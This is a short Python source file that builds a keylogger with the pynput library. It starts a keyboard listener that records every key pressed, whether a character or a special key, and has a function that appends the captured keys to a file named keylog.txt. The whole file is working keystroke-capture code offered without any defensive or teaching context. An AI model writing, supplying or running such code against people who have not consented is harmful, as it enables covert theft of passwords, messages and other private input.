from pynput import keyboard
import threading

log_file = "keylog.txt"
log = []

def write_log():
    with open(log_file, "a") as f:
        for key in log:
            f.write(f"{key}\n")

def on_press(key):
    try:
        log.append(key.char)
    except AttributeError:
        log.append(str(key))

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("Keylogger started...")
    return listener
